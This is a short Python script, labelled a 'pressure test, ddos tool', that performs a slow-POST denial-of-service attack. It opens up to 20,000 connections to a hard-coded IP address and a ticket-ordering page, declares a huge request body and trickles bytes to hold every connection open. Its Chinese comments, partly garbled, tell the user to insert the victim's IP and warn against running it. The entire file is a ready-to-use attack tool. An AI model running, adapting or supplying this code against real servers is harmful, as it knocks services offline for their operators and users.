import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------

MAX_CONN=20000

PORT=8080

HOST="47.113.126.130"#在双引号bai里输入对方duIP或域名，要保证他联网了或开机了，这里拿百度zhi做示范（别运行！不然后果自负！！）

PAGE="/TicketOrderSys/flight_indexList.action"

#---------------------------


buf = ("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))

socks = []

def conn_thread():
    global socks

    for i in range(0,MAX_CONN):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            print ("Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print ("Could not connect to server or send error:%s"%ex)
time.sleep(10)

#end def

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                #print "send OK!"
            except Exception as ex:
                print ("Send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
time.sleep(1)

#end def

conn_th=threading.Thread(target=conn_thread,args=())

send_th=threading.Thread(target=send_thread,args=())

conn_th.start()

send_th.start()